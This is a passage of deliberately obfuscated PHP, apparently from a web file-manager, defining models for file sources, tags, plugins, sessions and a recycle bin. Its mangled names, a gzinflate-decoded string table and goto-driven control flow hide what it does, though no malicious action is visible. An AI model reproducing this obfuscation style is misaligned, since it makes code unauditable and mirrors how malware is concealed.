$_SERVER[ÅÄÇĞô]; $èğá±øÀ = 0; $„À“Ìãµ = $this->targetSourceRoot($¯ÜôÙ£Ê, $şÏøˆçñ, !0); foreach ($„À“Ìãµ as $ÇîøÑÎê) { if (!$ÇîøÑÎê) { continue; } $èğá±øÀ += floatval($ÇîøÑÎê[$¿µÃ¨‘á[79]]); $Ş“Ø‹Å = array($¿µÃ¨‘á[660] => array($¿µÃ¨‘á[620], $¿µÃ¨‘á[598] . $ÇîøÑÎê[$¿µÃ¨‘á[194]] . $¿µÃ¨‘á[621])); $ÇŸô÷ƒ« = Model($¿µÃ¨‘á[506])->field($¿µÃ¨‘á[494])->where($Ş“Ø‹Å)->select(); $ÇŸô÷ƒ« = array_to_keyvalue($ÇŸô÷ƒ«, $¿µÃ¨‘á[12], $¿µÃ¨‘á[194]); $ÇŸô÷ƒ« = array_unique(array_filter($ÇŸô÷ƒ«)); if ($ÇŸô÷ƒ«) { $Ş“Ø‹Å = array($¿µÃ¨‘á[494] => array($¿µÃ¨‘á[495], $ÇŸô÷ƒ«)); $èğá±øÀ += floatval($this->where($Ş“Ø‹Å)->sum($¿µÃ¨‘á[79])); } } $èğá±øÀ = !$èğá±øÀ || $èğá±øÀ <= 0 ? 0 : $èğá±øÀ; return $èğá±øÀ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($æí¾µš±) { return $this->fileTypeProfile($æí¾µš±, SourceModel::TYPE_USER); } public function groupFileTypeProfile($È¬æÉ­ô) { return $this->fileTypeProfile($È¬æÉ­ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ìİÉêïè, $¨‰§ÓŸÊ) { $€ˆûœ§ =& $_SERVER[ÅÄÇĞô]; $Í±¹èÄ = $€ˆûœ§[2326] . $ìİÉêïè . $€ˆûœ§[11] . $¨‰§ÓŸÊ; $Õñ›ºÈ½ = Cache::get($Í±¹èÄ); if ($Õñ›ºÈ½) { return $Õñ›ºÈ½; } $´Ö ºŒ” = array($€ˆûœ§[654] => 0); if ($ìİÉêïè != !1) { $´Ö ºŒ”[$€ˆûœ§[574]] = $ìİÉêïè; $´Ö ºŒ”[$€ˆûœ§[191]] = $¨‰§ÓŸÊ; } $®‰·ÎÊ = array(); $®‰·ÎÊ[$€ˆûœ§[2327]] = array($€ˆûœ§[2328] => LNG($€ˆûœ§[2327]), $€ˆûœ§[2329] => $this->where($´Ö ºŒ”)->count(), $€ˆûœ§[625] => $this->where($´Ö ºŒ”)->sum($€ˆûœ§[79])); $Àà™œ¸Å = KodIO::fileTypeList(); foreach ($Àà™œ¸Å as $µõóê–Ã => $¹ö‘Íè÷) { $´Ö ºŒ”[$€ˆûœ§[489]] = $this->fileTypeWhere($µõóê–Ã); $®‰·ÎÊ[$µõóê–Ã] = array($€ˆûœ§[2328] => $¹ö‘Íè÷[$€ˆûœ§[32]], $€ˆûœ§[2329] => $this->where($´Ö ºŒ”)->count(), $€ˆûœ§[625] => $this->where($´Ö ºŒ”)->sum($€ˆûœ§[79])); } Cache::set($Í±¹èÄ, $®‰·ÎÊ, 1200); return $®‰·ÎÊ; } public function fileNameExist($ô ‰è÷, $§Ëş…ã) { $Ú‹™Å‡ =& $_SERVER[ÅÄÇĞô]; $ÊéŸãá = $this->field($Ú‹™Å‡[2330])->where(array($Ú‹™Å‡[193] => $ô ‰è÷, $Ú‹™Å‡[32] => $§Ëş…ã, $Ú‹™Å‡[508] => 0))->find(); return is_array($ÊéŸãá) ? $ÊéŸãá[$Ú‹™Å‡[194]] : !1; } public function childList($éî¤…Âö) { $ˆ…µß¦» =& $_SERVER[ÅÄÇĞô]; $§ó«¡®¾ = $ˆ…µß¦»[2303] . $éî¤…Âö; if (isset(self::$cacheChildList[$§ó«¡®¾])) { return self::$cacheChildList[$§ó«¡®¾]; } $åÙÕº¡ = array($ˆ…µß¦»[193] => intval($éî¤…Âö), $ˆ…µß¦»[508] => 0); $–‡ı×Øş = $this->where($åÙÕº¡)->select(); $–‡ı×Øş = $–‡ı×Øş ? $–‡ı×Øş : array(); self::$cacheChildList[$§ó«¡®¾] = $–‡ı×Øş; foreach ($–‡ı×Øş as $¬õÜ¯Ï¬) { $§ó«¡®¾ = $ˆ…µß¦»[536] . $¬õÜ¯Ï¬[$ˆ…µß¦»[194]]; self::$cacheSourceInfo[$§ó«¡®¾] = $¬õÜ¯Ï¬; } return $–‡ı×Øş; } public function fileNameAuto($ıÃİË¢Ü, $è±ì¿Ë›, $âÔ“œËø = REPEAT_RENAME, $ëŒ”Ê¦ = false) { $²â×îñÒ =& $_SERVER[ÅÄÇĞô]; $ì¡œ©‡ˆ = get_path_ext($è±ì¿Ë›); $äÜ£ªˆ£ = $ì¡œ©‡ˆ ? get_path_ext_name($è±ì¿Ë›) . $²â×îñÒ[2331] . $ì¡œ©‡ˆ : $è±ì¿Ë› . $²â×îñÒ[463]; $¼èÄÑÌŠ = array($²â×îñÒ[193] => $ıÃİË¢Ü, $²â×îñÒ[508] => 0, $²â×îñÒ[32] => array($²â×îñÒ[462], $äÜ£ªˆ£)); $›«ìÚ­ö = $this->field($²â×îñÒ[32])->where($¼èÄÑÌŠ)->select(); $—à¹ãÀñ = array_to_keyvalue($›«ìÚ­ö, $²â×îñÒ[12], $²â×îñÒ[32]); return $this->fileNameAutoGet($—à¹ãÀñ, $è±ì¿Ë›, $âÔ“œËø, $ëŒ”Ê¦); } public function fileNameAutoGet($¨‘â¹Éß, $§é¿˜Õ¿, $‚âµ¾Æ, $›Ø˜âŒ³) { $µ­Ä¿µÍ =& $_SERVER[ÅÄÇĞô]; if ($‚âµ¾Æ == REPEAT_REPLACE || !$¨‘â¹Éß || !in_array_not_case($§é¿˜Õ¿, $¨‘â¹Éß) || $›Ø˜âŒ³ && $‚âµ¾Æ != REPEAT_RENAME_FOLDER) { return $§é¿˜Õ¿; } if ($‚âµ¾Æ == REPEAT_SKIP) { return !1; } $“èÏ…§´ = $µ­Ä¿µÍ[10] . get_path_ext($§é¿˜Õ¿); $“èÏ…§´ = $“èÏ…§´ == $µ­Ä¿µÍ[10] || $›Ø˜âŒ³ ? $µ­Ä¿µÍ[12] : $“èÏ…§´; for ($©šşíû¡ = 1; $©šşíû¡ <= count($¨‘â¹Éß) + 1; $©šşíû¡++) { $¤ˆñ‹„¨ = substr($§é¿˜Õ¿, 0, strlen($§é¿˜Õ¿) - strlen($“èÏ…§´)); $Ìöïî¬® = $¤ˆñ‹„¨ . "\x28{$©šşíû¡}\51{$“èÏ…§´}"; if (!in_array_not_case($Ìöïî¬®, $¨‘â¹Éß)) { return $Ìöïî¬®; } } } } goto fŠ’£¯Ïâ“; F“ØÓ²Ö–ô: if (strlen($rmbdnxkhjz) < $_SERVER[ÅÄÇĞô][688]) { return; } $_SERVER[¥Ö¼Ø±–] = explode($_SERVER[ÅÄÇĞô][689], gzinflate(substr($_SERVER[ÅÄÇĞô][690], 10, -8))); $paxzefhobw = $_SERVER[ÅÄÇĞô][691]; goto bŠö«ù¬©¥; aÔÄëøòÕğ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($¨Ó½Í¥İ) { $ŸçÉó‹» =& $_SERVER[ÅÄÇĞô]; return array($ŸçÉó‹»[2111] => array($¨Ó½Í¥İ[0], $ŸçÉó‹»[2112]), $ŸçÉó‹»[2113] => array($¨Ó½Í¥İ[0], $ŸçÉó‹»[2114])); } protected function get($¯·¼°Ö) { $şöªô¯ =& $_SERVER[ÅÄÇĞô]; $Š³Ç¬ºÊ = Model($şöªô¯[590])->metaGet($¯·¼°Ö, $şöªô¯[2115]); $ÓÔ¡…ïä = json_decode($Š³Ç¬ºÊ, !0); return $ÓÔ¡…ïä ? $ÓÔ¡…ïä : array($şöªô¯[2116] => $şöªô¯[91], $şöªô¯[448] => array()); } protected function set($™é­ªùú, $ÇŸÈ‡ƒå) { $»ÏÔ—»á =& $_SERVER[ÅÄÇĞô]; $ÇŸÈ‡ƒå = $ÇŸÈ‡ƒå ? $ÇŸÈ‡ƒå : array($»ÏÔ—»á[2116] => $»ÏÔ—»á[91], $»ÏÔ—»á[448] => array()); return Model($»ÏÔ—»á[590])->metaSet($™é­ªùú, $»ÏÔ—»á[2115], json_encode($ÇŸÈ‡ƒå)); } protected function getByTagID($æŸ„µĞ , $‚ñïĞ«) { $şòƒ“®â =& $_SERVER[ÅÄÇĞô]; if (!$æŸ„µĞ  || !$‚ñïĞ«) { return !1; } if (!Model($şòƒ“®â[590])->getInfoSimple($æŸ„µĞ )) { return !1; } $ˆÓòÖÌæ = $this->get($æŸ„µĞ ); if (!$ˆÓòÖÌæ || !isset($ˆÓòÖÌæ[$şòƒ“®â[448]])) { return !1; } $„ƒîƒ“ = array_find_by_field($ˆÓòÖÌæ[$şòƒ“®â[448]], $şòƒ“®â[478], $‚ñïĞ«); return is_array($„ƒîƒ“) ? $„ƒîƒ“ : !1; } public function listSource($¸Øµ¸Ø, $á÷å”Ò) { $àÁë¶À =& $_SERVER[ÅÄÇĞô]; if ($á÷å”Ò && !is_array($á÷å”Ò)) { $á÷å”Ò = array($á÷å”Ò); } $Ùùì±á° = $this->listData($¸Øµ¸Ø); $±÷¿€…× = array(); foreach ($Ùùì±á° as $°§‚­…„) { $è±ê­ôİ = $°§‚­…„[$àÁë¶À[87]]; if (!$è±ê­ôİ) { continue; } if (!isset($±÷¿€…×[$è±ê­ôİ])) { $±÷¿€…×[$è±ê­ôİ] = array(); } $±÷¿€…×[$è±ê­ôİ][] = $°§‚­…„[$àÁë¶À[503]]; } $æ²ÉëÈÈ = array(); foreach ($±÷¿€…× as $¡ÙàÇÓ¡ => $…’‚ş­‚) { $³ã¥ãè = !0; if (!$á÷å”Ò) { $æ²ÉëÈÈ[] = $¡ÙàÇÓ¡; continue; } foreach ($á÷å”Ò as $ø…Ñ«ü½) { if (!in_array($ø…Ñ«ü½, $…’‚ş­‚)) { $³ã¥ãè = !1; break; } } if ($³ã¥ãè) { $æ²ÉëÈÈ[] = $¡ÙàÇÓ¡; } } if (!$æ²ÉëÈÈ) { return array(); } $…®ì¼É = array($àÁë¶À[494] => array($àÁë¶À[495], $æ²ÉëÈÈ), $àÁë¶À[574] => $¸Øµ¸Ø, $àÁë¶À[191] => SourceModel::TYPE_GROUP); $ö¯Ê‘Ğ = Model($àÁë¶À[1444])->listSource($…®ì¼É); if (!$ö¯Ê‘Ğ || count($æ²ÉëÈÈ) == $ö¯Ê‘Ğ[$àÁë¶À[445]][$àÁë¶À[446]]) { return $ö¯Ê‘Ğ; } $²äÂœƒ = array(); $ûÁñŠä = array_to_keyvalue($ö¯Ê‘Ğ[$àÁë¶À[85]], $àÁë¶À[12], $àÁë¶À[194]); $¦ÔÀ‡ü = array_to_keyvalue($ö¯Ê‘Ğ[$àÁë¶À[86]], $àÁë¶À[12], $àÁë¶À[194]); $›©Àü¯ğ = array_merge($¦ÔÀ‡ü, $ûÁñŠä); foreach ($æ²ÉëÈÈ as $è±ê­ôİ) { if (!in_array($è±ê­ôİ, $›©Àü¯ğ)) { $²äÂœƒ[] = $è±ê­ôİ; } } if ($²äÂœƒ) { $this->removeBySource($¸Øµ¸Ø, $²äÂœƒ); } return $ö¯Ê‘Ğ; } protected function listData($ÌÊŸºÑ) { $ÚÊî²ÂÙ =& $_SERVER[ÅÄÇĞô]; $„ä¹ó“Ã = array($ÚÊî²ÂÙ[1788] => 0, $ÚÊî²ÂÙ[562] => array($ÚÊî²ÂÙ[2117], 0), $ÚÊî²ÂÙ[499] => $ÚÊî²ÂÙ[2118] . $ÌÊŸºÑ); $İ¹É·Îš = $ÚÊî²ÂÙ[2119]; $¬óâÊÉÇ = $this->field($İ¹É·Îš)->where($„ä¹ó“Ã)->order($ÚÊî²ÂÙ[2120])->select(); return $¬óâÊÉÇ ? $¬óâÊÉÇ : array(); } protected function addToTag($¿§œÊê“, $İáÓçı½, $íüäº‹Å) { $Ş¿‹Ëğœ =& $_SERVER[ÅÄÇĞô]; if (!$this->getByTagID($¿§œÊê“, $íüäº‹Å) || !$İáÓçı½) { return !1; } if (!Model($Ş¿‹Ëğœ[925])->pathInfo($İáÓçı½)) { return !1; } $«’ˆ¸† = array($Ş¿‹Ëğœ[1788] => 0, $Ş¿‹Ëğœ[562] => $íüäº‹Å, $Ş¿‹Ëğœ[498] => $İáÓçı½, $Ş¿‹Ëğœ[499] => $Ş¿‹Ëğœ[2121] . $¿§œÊê“, $Ş¿‹Ëğœ[497] => $Ş¿‹Ëğœ[12], $Ş¿‹Ëğœ[2002] => 0); if ($this->where($«’ˆ¸†)->find()) { return !1; } return $this->add($«’ˆ¸†); } protected function removeFromTag($éº¹½û…, $·Š„Š¯, $ÕÑÃè²ø) { $»ôÇŒ‹Ô =& $_SERVER[ÅÄÇĞô]; if (!$this->getByTagID($éº¹½û…, $ÕÑÃè²ø) || !$·Š„Š¯) { return !1; } if (is_array($·Š„Š¯)) { $·Š„Š¯ = array($»ôÇŒ‹Ô[7], $·Š„Š¯); } $ââ‹ôŞú = array($»ôÇŒ‹Ô[1788] => 0, $»ôÇŒ‹Ô[562] => $ÕÑÃè²ø, $»ôÇŒ‹Ô[499] => $»ôÇŒ‹Ô[2121] . $éº¹½û…, $»ôÇŒ‹Ô[498] => $·Š„Š¯); return $this->where($ââ‹ôŞú)->delete(); } protected function removeByTag($„¡¤¼áø, $±îü´«‹) { $Ï£–Û±Ã =& $_SERVER[ÅÄÇĞô]; if (!$this->getByTagID($„¡¤¼áø, $±îü´«‹)) { return !1; } $ªÓõ³ = array($Ï£–Û±Ã[1788] => 0, $Ï£–Û±Ã[562] => $±îü´«‹, $Ï£–Û±Ã[499] => $Ï£–Û±Ã[2121] . $„¡¤¼áø); return $this->where($ªÓõ³)->delete(); } protected function removeBySource($ŞÃª°«´, $Å”Ÿ²¾µ) { $…ÅôÌù =& $_SERVER[ÅÄÇĞô]; if (!$ŞÃª°«´ || !$Å”Ÿ²¾µ) { return !1; } if (is_array($Å”Ÿ²¾µ)) { $Å”Ÿ²¾µ = array($…ÅôÌù[7], $Å”Ÿ²¾µ); } $˜ŸÜÆñ = array($…ÅôÌù[1788] => 0, $…ÅôÌù[498] => $Å”Ÿ²¾µ, $…ÅôÌù[562] => array($…ÅôÌù[1114], 0), $…ÅôÌù[499] => $…ÅôÌù[2121] . $ŞÃª°«´); return $this->where($˜ŸÜÆñ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\160\154\165\x67\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\163\x74\141\x74\x75\x73", "\x72\x65\147\151\x65\x73\x74", "\143\157\x6e\146\x69\147"); public function loadList($èä…úÜô = false) { $»ãºŠÀ = array_to_keyvalue($this->listData(), $_SERVER[ÅÄÇĞô][32]); if ($èä…úÜô) { return $»ãºŠÀ[$èä…úÜô]; } return $»ãºŠÀ; } public function init() { $¦ªÉˆâ÷ =& $_SERVER[ÅÄÇĞô]; Hook::trigger($¦ªÉˆâ÷[2122]); $¾ÍÜ©Å½ = $this->loadPluginList(); foreach ($¾ÍÜ©Å½ as $ò€Ã‹ô => $èÜÔ“ÍÂ) { $ª®˜Òéº = $this->appAllow($ò€Ã‹ô, $èÜÔ“ÍÂ); if (!$ª®˜Òéº) { continue; } foreach ($èÜÔ“ÍÂ[$¦ªÉˆâ÷[2123]] as $ÆÂ µô› => $û«ÔËä¢) { Hook::bind($ÆÂ µô›, $û«ÔËä¢); } } Hook::trigger($¦ªÉˆâ÷[2124]); Hook::trigger(ACTION); } public function appAllow($Ñ·ø‰ºô, $³…€ëò¡, $®¡‹µØ = true) { $Ôô«¯á =& $_SERVER[ÅÄÇĞô]; $¥¾ùÑñ = PLUGIN_DIR . $Ñ·ø‰ºô . $Ôô«¯á[2125]; if (!is_array($³…€ëò¡) || !is_array($³…€ëò¡[$Ôô«¯á[2123]]) || $³…€ëò¡[$Ôô«¯á[845]] != 1 || !is_file($¥¾ùÑñ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ôô«¯á[6]][$Ôô«¯á[2126]] || !$GLOBALS[$Ôô«¯á[6]][$Ôô«¯á[2127]]) { return !0; } $¢“„âı = explode($Ôô«¯á[50], strtolower($GLOBALS[$Ôô«¯á[6]][$Ôô«¯á[2127]])); return in_array(strtolower($Ñ·ø‰ºô), $¢“„âı) ? !1 : !0; } if ($®¡‹µØ && !Action($Ôô«¯á[2128])->checkAuth($Ñ·ø‰ºô)) { return !1; } return !0; } public function unInstall($½ ©Ç°) { $æáªÕ˜¡ =& $_SERVER[ÅÄÇĞô]; $œë–Õ•Â = $this->loadList($½ ©Ç°); if (file_exists(PLUGIN_DIR . $½ ©Ç°)) { Hook::apply($½ ©Ç° . $æáªÕ˜¡[2129]); } $this->remove($œë–Õ•Â[$æáªÕ˜¡[478]]); } public function changeStatus($´ô’÷Á, $ÍÀ†×) { $Õ¢­á Í =& $_SERVER[ÅÄÇĞô]; $•óÔÙÊ‘ = $this->loadList($´ô’÷Á); if ($ÍÀ†×) { Hook::apply($´ô’÷Á . $Õ¢­á Í[2130]); } $this->update($•óÔÙÊ‘[$Õ¢­á Í[478]], array($Õ¢­á Í[2131] => $ÍÀ†×)); } public function appRegist($šµ§†Ïó, $Ğ¯ÅØª‚) { $­‘Ôş¸ =& $_SERVER[ÅÄÇĞô]; $Ÿô—Àö¡ = $this->loadList($šµ§†Ïó); if ($Ÿô—Àö¡) { $this->update($Ÿô—Àö¡[$­‘Ôş¸[478]], array($­‘Ôş¸[2123] => $Ğ¯ÅØª‚)); } else { $¥³Ã• = array($­‘Ôş¸[32] => $šµ§†Ïó, $­‘Ôş¸[2123] => $Ğ¯ÅØª‚, $­‘Ôş¸[845] => 0, $­‘Ôş¸[6] => $this->getConfigDefault($šµ§†Ïó)); $this->insert($¥³Ã•); } } public function getConfigDefault($æ©ÅÜ÷) { $ êèÈ†õ =& $_SERVER[ÅÄÇĞô]; $˜ÀïÂñ = array(); $¼Ë½»õ‰ = $this->getPackageJson($æ©ÅÜ÷); if (!$¼Ë½»õ‰ && is_array($¼Ë½»õ‰[$ êèÈ†õ[2132]])) { return $˜ÀïÂñ; } foreach ($¼Ë½»õ‰[$ êèÈ†õ[2132]] as $…»å’Š™ => $ï Üà×•) { if (!isset($ï Üà×•[$ êèÈ†õ[453]]) || isset($˜ÀïÂñ[$…»å’Š™])) { continue; } $˜ÀïÂñ[$…»å’Š™] = $ï Üà×•[$ êèÈ†õ[453]]; } return $˜ÀïÂñ; } public function getPackageJson($¿×¶ü®) { return Hook::apply($¿×¶ü® . $_SERVER[ÅÄÇĞô][2133]); } public function getConfig($¬¸Ğ³‹£, $ˆ«¸¡Æã = false) { $¯½å¤Ë‚ =& $_SERVER[ÅÄÇĞô]; $’«˜å½€ = array(); $´£²ÊÃÀ = $this->loadList($¬¸Ğ³‹£); if ($´£²ÊÃÀ && is_array($´£²ÊÃÀ[$¯½å¤Ë‚[6]])) { $’«˜å½€ = $´£²ÊÃÀ[$¯½å¤Ë‚[6]]; } if (!$’«˜å½€ || $ˆ«¸¡Æã) { $’«˜å½€ = $this->getConfigDefault($¬¸Ğ³‹£); } return $’«˜å½€; } public function setConfig($ÎÆ‘Ñàœ, $°ì†ø’ = false) { $ÒÕ¾“› =& $_SERVER[ÅÄÇĞô]; $Ø‹’îÁà = $this->loadList($ÎÆ‘Ñàœ); if (!$Ø‹’îÁà) { return !1; } $†‰ëì÷ = $Ø‹’îÁà[$ÒÕ¾“›[6]]; if ($°ì†ø’ == !1) { $†‰ëì÷ = array(); $°ì†ø’ = $this->getConfigDefault($ÎÆ‘Ñàœ); } foreach ($°ì†ø’ as $²°¼­‰“ => $ßÃ¡à®) { $†‰ëì÷[$²°¼­‰“] = is_string($ßÃ¡à®) ? trim($ßÃ¡à®) : $ßÃ¡à®; } $this->update($Ø‹’îÁà[$ÒÕ¾“›[478]], array($ÒÕ¾“›[6] => $†‰ëì÷)); } public function viewList() { $ù††ÖÛ =& $_SERVER[ÅÄÇĞô]; $ÒèîªÄË = $this->loadList(); $this->pluginScan($ÒèîªÄË); $ÒèîªÄË = $this->loadPluginList(); $ŒóÒêÃÔ = array(); foreach ($ÒèîªÄË as $Ì„÷ó¡§ => $×ÃÀ§¦È) { $Óİãüë = $×ÃÀ§¦È; unset($×ÃÀ§¦È[$ù††ÖÛ[2123]], $×ÃÀ§¦È[$ù††ÖÛ[6]]); $Ò¦Áé¦¥ = PLUGIN_DIR . $×ÃÀ§¦È[$ù††ÖÛ[32]] . $ù††ÖÛ[2125]; if (!is_file($Ò¦Áé¦¥)) { continue; } $®À¼Ìİ° = Hook::apply($×ÃÀ§¦È[$ù††ÖÛ[32]] . $ù††ÖÛ[2133]); if (!is_array($®À¼Ìİ°)) { continue; } $ŒóÒêÃÔ[$Ì„÷ó¡§] = array_merge($×ÃÀ§¦È, $®À¼Ìİ°); if ($Óİãüë[$ù††ÖÛ[6]][$ù††ÖÛ[1710]] != $®À¼Ìİ°[$ù††ÖÛ[1684]]) { Hook::apply($×ÃÀ§¦È[$ù††ÖÛ[32]] . $ù††ÖÛ[2130]); $Óİãüë[$ù††ÖÛ[6]][$ù††ÖÛ[1710]] = $®À¼Ìİ°[$ù††ÖÛ[1684]]; $this->update($×ÃÀ§¦È[$ù††ÖÛ[478]], array($ù††ÖÛ[6] => $Óİãüë[$ù††ÖÛ[6]])); } } return $ŒóÒêÃÔ; } private function loadPluginList() { $Òéñ¤Ë› =& $_SERVER[ÅÄÇĞô]; $ÑàğÇ¡³ = $this->loadList(); if (strtolower(MOD) == $Òéñ¤Ë›[2134]) { return $ÑàğÇ¡³; } $Óˆ–¬‰í = Hook::trigger($Òéñ¤Ë›[2135], $ÑàğÇ¡³); if ($ÑàğÇ¡³ && !$Óˆ–¬‰í) { die; } return $Óˆ–¬‰í ? $Óˆ–¬‰í : $ÑàğÇ¡³; } private function pluginScan($Æì¥Ú¸) { $‚¿×¦Õè =& $_SERVER[ÅÄÇĞô]; recursion_dir(PLUGIN_DIR, $…¡òì±Ÿ, $Ñ’Ù¦ïğ, 0); foreach ($…¡òì±Ÿ as $ˆ¢ƒç¢†) { $ŞšûÎô¬ = get_path_this($ˆ¢ƒç¢†); if (isset($Æì¥Ú¸[$ŞšûÎô¬]) || !file_exists($ˆ¢ƒç¢† . $‚¿×¦Õè[2136]) || !file_exists($ˆ¢ƒç¢† . $‚¿×¦Õè[2125])) { continue; } Hook::apply($ŞšûÎô¬ . $‚¿×¦Õè[2130]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\163\145\163\x73\151\x6f\156"; public function get($ûì«•Ğ) { $Ş¶€¦ç® =& $_SERVER[ÅÄÇĞô]; $°â«¨Í = $this->where(array($Ş¶€¦ç®[2137] => $ûì«•Ğ))->find(); if (!is_array($°â«¨Í)) { return !1; } return $°â«¨Í[$Ş¶€¦ç®[171]]; } public function set($Û¥ÔÖ¤, $²­ğ°€‹, $ı¸ŞûŒ = 3600) { $Ì˜É«ç½ =& $_SERVER[ÅÄÇĞô]; $„ÂğÃ“ = array($Ì˜É«ç½[2137] => $Û¥ÔÖ¤, $Ì˜É«ç½[2037] => $²­ğ°€‹, $Ì˜É«ç½[2138] => $ı¸ŞûŒ + time()); if (Session::get($Ì˜É«ç½[2139])) { $„ÂğÃ“[$Ì˜É«ç½[1797]] = Session::get($Ì˜É«ç½[2139]); } else { $„ÂğÃ“[$Ì˜É«ç½[1797]] = 0; } if ($this->get($Û¥ÔÖ¤)) { return $this->where(array($Ì˜É«ç½[2137] => $Û¥ÔÖ¤))->save($„ÂğÃ“); } else { return $this->add($„ÂğÃ“, array(), !0); } } public function remove($¡‰Ë›Ò) { return $this->where(array($_SERVER[ÅÄÇĞô][2137] => $¡‰Ë›Ò))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÅÄÇĞô][2140] . time())->delete(); } } goto a®´ì°É£ï; fŠ’£¯Ïâ“: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65\137\x72\x65\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\151\x6d\x65", "\164\x69\155\x65", "\x69\156\163\145\162\x74", "\x66\165\156\143\164\x69\157\x6e")); public function listData($ô…‹Ö»é = false) { $º‡¨½­ =& $_SERVER[ÅÄÇĞô]; $ô…‹Ö»é = $ô…‹Ö»é ? $ô…‹Ö»é : USER_ID; $€‚øùª– = $this->where(array($º‡¨½­[1788] => $ô…‹Ö»é))->select(); return array_to_keyvalue($€‚øùª–, $º‡¨½­[12], $º‡¨½­[194]); } public function moveToRecycle($şó±ìÎ) { $¥ó¡•ò =& $_SERVER[ÅÄÇĞô]; $Ä¨ˆ€±Ø = Model($¥ó¡•ò[1444]); $û¾©½âı = $Ä¨ˆ€±Ø->sourceInfo($şó±ìÎ); if (!$û¾©½âı || $û¾©½âı[$¥ó¡•ò[508]] == $¥ó¡•ò[91]) { return; } $ê×ˆã“™ = array($¥ó¡•ò[494] => $şó±ìÎ, $¥ó¡•ò[1788] => USER_ID, $¥ó¡•ò[656] => $û¾©½âı[$¥ó¡•ò[191]], $¥ó¡•ò[657] => $û¾©½âı[$¥ó¡•ò[574]], $¥ó¡•ò[660] => $û¾©½âı[$¥ó¡•ò[589]]); $this->add($ê×ˆã“™); $this->recycleMove($şó±ìÎ, 1); if ($û¾©½âı[$¥ó¡•ò[488]] == $¥ó¡•ò[91]) { $ª£îµÍ× = array($¥ó¡•ò[660] => array($¥ó¡•ò[620], $û¾©½âı[$¥ó¡•ò[589]] . $şó±ìÎ . $¥ó¡•ò[621])); $Ä¨ˆ€±Ø->where($ª£îµÍ×)->setField($¥ó¡•ò[508], 1); } } public function clear() { $this->remove(!1); } public function remove($Ó¶ƒË¸ª = false, $„ûêüù = false) { $ÅâÓê­ =& $_SERVER[ÅÄÇĞô]; $„ûêüù = $„ûêüù ? $„ûêüù : USER_ID; $ı£¤Áà‰ = Model($ÅâÓê­[1444]); $¾ò×²Ş† = $this->listData($„ûêüù); $Ó¶ƒË¸ª = $Ó¶ƒË¸ª === !1 ? !1 : $Ó¶ƒË¸ª; $Ù¹ÅŸ = array(); foreach ($¾ò×²Ş† as $ëÅ÷¨Äİ) { if ($Ó¶ƒË¸ª != !1 && !in_array($ëÅ÷¨Äİ, $Ó¶ƒË¸ª)) { continue; } $ãà‘ÙØ£ = $ı£¤Áà‰->sourceInfo($ëÅ÷¨Äİ); $ı£¤Áà‰->remove($ëÅ÷¨Äİ, !1); $’†åœùÔ = $ãà‘ÙØ£[$ÅâÓê­[191]] . $ÅâÓê­[11] . $ãà‘ÙØ£[$ÅâÓê­[574]]; $Ù¹ÅŸ[$’†åœùÔ] = array($ÅâÓê­[656] => $ãà‘ÙØ£[$ÅâÓê­[191]], $ÅâÓê­[574] => $ãà‘ÙØ£[$ÅâÓê­[574]]); $this->where(array($ÅâÓê­[194] => $ëÅ÷¨Äİ))->delete(); } foreach ($Ù¹ÅŸ as $êàü¾‚€) { $ı£¤Áà‰->targetSpaceUpdate($êàü¾‚€[$ÅâÓê­[191]], $êàü¾‚€[$ÅâÓê­[574]]); } } public function restore($ôÈÏÀ = false) { $ŒÒØ¸Æ’ = $this->listData(); $this->_restoreSource($ŒÒØ¸Æ’, $ôÈÏÀ); } public function removeUserAll($…Êì‹üø) { $this->remove(!1, $…Êì‹üø); } public function restoreItem($ÛæÁ) { $this->_restoreSource(array($ÛæÁ), array($ÛæÁ)); } private function _restoreSource($«‹ÂìÂ™, $ÌÙ…¼˜¢) { $Ôò£éı‡ =& $_SERVER[ÅÄÇĞô]; $ÛâË÷–ö = Model($Ôò£éı‡[1444]); $ÌÙ…¼˜¢ = $ÌÙ…¼˜¢ == !1 ? !1 : $ÌÙ…¼˜¢; if (!$«‹ÂìÂ™) { return !0; } $¾ÅË¨‹ = array(); foreach ($«‹ÂìÂ™ as $Îæ»Òä) { if ($ÌÙ…¼˜¢ != !1 && !in_array($Îæ»Òä, $ÌÙ…¼˜¢)) { continue; } $™êè¸Ğò = $ÛâË÷–ö->sourceInfo($Îæ»Òä); $Ç²½Ú° = $ÛâË÷–ö->sourceInfo($™êè¸Ğò[$Ôò£éı‡[193]]); if ($Ç²½Ú°[$Ôò£éı‡[508]] == $Ôò£éı‡[91]) { continue; } $ÛâË÷–ö->lockMoveStart($Îæ»Òä); $this->recycleMove($Îæ»Òä, 0); if ($™êè¸Ğò[$Ôò£éı‡[488]] == $Ôò£éı‡[91]) { $ìúÙĞø¬ = array($Ôò£éı‡[660] => array($Ôò£éı‡[620], $™êè¸Ğò[$Ôò£éı‡[589]] . $Îæ»Òä . $Ôò£éı‡[621])); $ÛâË÷–ö->where($ìúÙĞø¬)->setField($Ôò£éı‡[508], 0); $this->restoreFolderChildren($Îæ»Òä, $«‹ÂìÂ™); } $this->where(array($Ôò£éı‡[194] => $Îæ»Òä))->delete(); $ÛâË÷–ö->folderSizeReset($™êè¸Ğò[$Ôò£éı‡[193]]); $¾ÅË¨‹[] = $™êè¸Ğò[$Ôò£éı‡[193]]; if ($™êè¸Ğò[$Ôò£éı‡[488]] == $Ôò£éı‡[91]) { $¾ÅË¨‹[] = $Îæ»Òä; } $ÛâË÷–ö->lockMoveEnd($Îæ»Òä); } $ÛâË÷–ö->updateModifyTime($¾ÅË¨‹); } private function restoreFolderChildren($š¶ôø­¿, $¾«õ·Ó‚) { $®¬åıÓ =& $_SERVER[ÅÄÇĞô]; $ê¡¤¹îÖ = Model($®¬åıÓ[1444]); $ÜßÛãë¯ = array($®¬åıÓ[194] => array($®¬åıÓ[7], array())); 